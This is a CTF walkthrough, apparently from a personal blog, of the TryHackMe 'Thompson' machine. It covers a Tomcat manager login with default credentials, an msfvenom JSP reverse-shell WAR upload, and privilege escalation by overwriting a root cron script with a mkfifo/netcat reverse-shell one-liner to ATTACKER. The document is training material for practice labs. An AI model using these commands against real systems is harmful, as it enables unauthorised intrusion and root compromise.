---
title: "Thompson"
date: 2024-04-29
draft: false
summary: "Writeup for Thompson CTF challenge on TryHackMe."
tags: ["linux", "rce", "default creds", "cron"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/thompson/cover.webp"
  caption: "Thompson TryHackMe Challenge"
  alt: "Thompson cover"
platform: "TryHackMe"
---

boot2root machine for FIT and bsides guatemala CTF
<!--more-->
To access the challenge, click on the link given below:
- https://tryhackme.com/r/room/bsidesgtthompson

## Reconnaissance

I performed an **nmap** aggressive scan to find open ports and the services running on them.

```shell
nmap -A -p- TARGET -oN thompson.nmap --min-rate 10000
```

| **Port** | **Service** | **Version**                     |
| -------- | ----------- | ------------------------------- |
| 22       | ssh         | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 8009     | ajp13       | Apache Jserv (Protocol v1.3)    |
| 8080     | http        | Apache Tomcat 8.5.5             |

![](https://cdn.ziomsec.com/thompson/1.webp)

## Initial Foothold

I accessed the web application running on port 8080 through my web browser.

![](https://cdn.ziomsec.com/thompson/2.webp)

The ajp page was inaccessible. I searched online and found an article on AJP on **hacktricks**.
- https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp

I brute forced directories on the web application using **ffuf** to increase my attack surface.

```shell
ffuf -u http://TARGET:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![](https://cdn.ziomsec.com/thompson/3.webp)

I then accessed the newly discovered endpoints and found a login panel at `/manager/` and `/host-manager`

![](https://cdn.ziomsec.com/thompson/4.webp)

I then tried logging in with default credentials *admin:admin*. The authentication failed, however, I got a valid username and password for the login panel.

![](https://cdn.ziomsec.com/thompson/5.webp)

Hence I logged in using those credentials : `tomcat | s3cret`. I got access to the manager panel. This seemed to control the pages present on the web app.

![](https://cdn.ziomsec.com/thompson/6.webp)

I was also allowed to upload my own code for a page.

![](https://cdn.ziomsec.com/thompson/7.webp)

![](https://cdn.ziomsec.com/thompson/8.webp)

I searched online and found a way to get an RCE from this manager on **hacktricks**.
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat

I generated an **msfvenom** payload and uploaded it on the web app.

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=1234 -f ware -o revshell.war
```

![](https://cdn.ziomsec.com/thompson/9.webp)

![](https://cdn.ziomsec.com/thompson/10.webp)

Finally, I started a **netcat** listener and executed the payload to receive a reverse shell.

```shell
rlwrap nc -lnvp 1234
```

![](https://cdn.ziomsec.com/thompson/11.webp)

After getting shell access, I captured the user flag from *jack*'s home directory.

```shell
cat /home/jack/user.txt
```

![](https://cdn.ziomsec.com/thompson/12.webp)

## Privilege Escalation

After getting the user flag, I looked at other files present in the home directory and found a bash script and a txt file. The bash script seemed to execute the **id** command and save the output in the txt file.

![](https://cdn.ziomsec.com/thompson/13.webp)

I viewed the cronjobs and found the bash script was being executed as root user.

```shell
cat /etc/crontab
```

![](https://cdn.ziomsec.com/thompson/14.webp)

Hence I visited **revshells** to get a reverse shell payload and added the payload at the end of the bash script.
- https://www.revshells.com

```shell
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 9001 >/tmp/f" > id.sh
```

![](https://cdn.ziomsec.com/thompson/15.webp)

I started a **netcat** listener and after a while, received a connection as root user.

```shell
rlwrap nc -lnvp 9001
```

Finally, I captured the root flag from the */root* directory.

```shell
cat /root/root.txt
```

![](https://cdn.ziomsec.com/thompson/16.webp)

That's it from my end!
Happy Hacking :)

---
